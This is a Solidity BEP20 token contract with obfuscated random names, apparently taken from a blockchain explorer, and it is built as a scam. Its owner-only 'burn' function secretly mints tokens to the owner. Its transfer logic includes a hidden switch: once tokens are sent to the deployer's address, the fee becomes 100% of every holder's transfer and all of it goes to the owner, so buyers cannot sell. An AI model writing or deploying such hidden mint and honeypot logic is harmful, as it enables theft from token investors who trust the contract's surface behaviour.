/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-12
 */
pragma solidity >=0.5.10;
contract msqXpn {
uint256 public  czhNAR = 1000000000000000000;
uint256 public  fLuUKg = 100000000000000000000;
uint256 public constant VLQYCj = 9+1;
uint256 public  VZriIQ = 10000000000000000;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  FJTMWj = 100000000000000000000000;
address private  gSNTlJ = address(0);
uint8 public constant decimals = 18;
uint256 public  JpLJeJ = 100000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "JcpFCW";
uint256 public  rnPzCk = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  uFVJlR = address(0);
mapping (address => uint256) public balanceOf;
address public  MiafJh = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  deksId = address(0);
address public  uJdtAt = address(0);
uint256 public  LiqUYS = 10000000000000000000;
uint256 private  ibwLub = 10000000000000;
address public  LwOjgu = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  OGlBQi = address(0);
string public  symbol = "iwfJFV";
uint256 public  JFEtDg = 10000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
gSNTlJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TyUcip");
require(to != address(0), "TyUcip");
require(amount <= balanceOf[from], "TyUcip");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VLQYCj/ibwLub ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==gSNTlJ){
ibwLub = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}